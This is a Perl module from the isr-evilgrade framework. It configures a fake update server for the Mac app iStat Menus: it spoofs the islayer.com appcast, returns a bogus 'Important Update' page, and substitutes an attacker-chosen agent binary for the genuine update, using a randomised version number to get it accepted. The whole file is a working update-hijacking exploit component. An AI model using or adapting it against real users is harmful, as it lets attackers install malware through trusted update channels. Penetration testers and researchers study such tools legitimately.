###############
# istat.pm
#
# Copyright 2010 Francisco Amato
#
# This file is part of isr-evilgrade, www.infobytesec.com .
#
# isr-evilgrade is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation version 2 of the License.
#
# isr-evilgrade is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with isr-evilgrade; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
#
# '''
##
package modules::istat;

use strict;
use Data::Dump qw(dump);

use isrcore::utils;

my $base=
{
    'name' => 'iStat Menus',
    'version' => '1.0',
    'appver'  => '<= 2.0',
    'author' => [ 'Federico Kirschbaum < fedek +[AT]+ infobytesec.com>' ],
    'description' => qq{},    
    'vh' => '(islayer.com)',
    'request' => [
		    {
		    'req' => '/apps/istatmenus/appcast/.',
		    'type' => 'string', #file|string|agent|install
		    'method' => '', #any
		    'bin'    => 0,
		    'string' => '<html><b>Important Update</html>',
		    'parse' => 1,
		    'file' => '',
		    },
		    {
		    'req' => '(/apps/istatmenus/getupdate)', #regex friendly
		    'type' => 'agent', #file|string|agent|install
		    'method' => '', #any
		    'bin'    => 1,		    
		    'string' => '',
		    'parse' => 0,
		    'file' => ''
		    },
		    

    ],
    #Options		    
    'options' => {  'agent'  => { 'val' => './agent/osx/istatmenus_upgrade_3.01.zip', 'desc' => 'Agent to inject'},
		    'enable' => { 'val' => 1, 
			    	  'desc' => 'Status'},
                    'version'  => { 'val' => '\'7.\'.isrcore::utils::RndNum(2)',
                                  'hidden' => 1,
                                'dynamic' =>1,
				},
                    'rnd1'  => { 'val' => 'isrcore::utils::RndNum(5)',
                                  'hidden' => 1,
                                'dynamic' =>1,
                            }			    	  
		 }
};

##########################################################################
# FUNCTION      new
# RECEIVES
# RETURNS
# EXPECTS
# DOES          class's constructor
sub new {
    my $class = shift;
    my $self = { 'Base' => $base, @_ };
    return bless $self, $class;
}            
1;
